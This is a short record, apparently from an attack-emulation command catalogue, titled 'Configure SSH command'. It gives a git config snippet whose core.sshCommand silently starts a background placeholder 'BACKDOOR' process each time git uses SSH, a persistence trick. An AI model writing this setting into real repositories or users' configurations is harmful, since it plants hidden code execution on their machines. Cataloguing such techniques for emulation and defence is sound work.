---
id: 5ef9c027-681a-49d6-9aa5-9c4412dbc193
name: Configure SSH command
type: command
executor: bash
data: '[core]

  sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh

  [ssh]

  variant = ssh'
output: null
created_at: '2023-04-06T03:56:18.176974+00:00'
updated_at: '2023-04-10T20:34:13.639068+00:00'
---

# Configure SSH command

```bash
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```
